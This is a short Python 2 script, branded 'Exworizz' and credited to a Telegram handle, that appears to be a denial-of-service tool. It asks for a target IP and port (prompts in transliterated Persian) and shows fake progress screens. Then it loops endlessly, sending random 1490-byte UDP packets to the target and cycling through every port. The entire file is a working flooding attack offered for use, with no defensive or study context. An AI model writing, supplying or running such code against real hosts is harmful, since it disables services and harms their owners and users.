import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet Exworizz")
print
print "script edited by @tf7_2008"
print "my telegram  :   @tf7_2008"
print
ip = raw_input("IP Khod ra Vared konid : ")
port = input("Port Khod Ra Vared Konid : ")

os.system("clear")
os.system("figlet Exworizz")
print("cheking please wait 5%")
time.sleep(1)
os.system("clear") 
print("Security{Exworizz }10%")
time.sleep(2)
os.system("clear") 
print("Loading...40%")
time.sleep(3)
os.system("clear") 
print("amade sazi....90%")
time.sleep(3)
os.system("clear") 
print("lunched(powered by Exwotizz.............................. 100%")
time.sleep(4)
os.system("clear") 
print("please wait")
time.sleep(6)
os.system("clear")
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "paket%s DDOS your site %s or port is:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

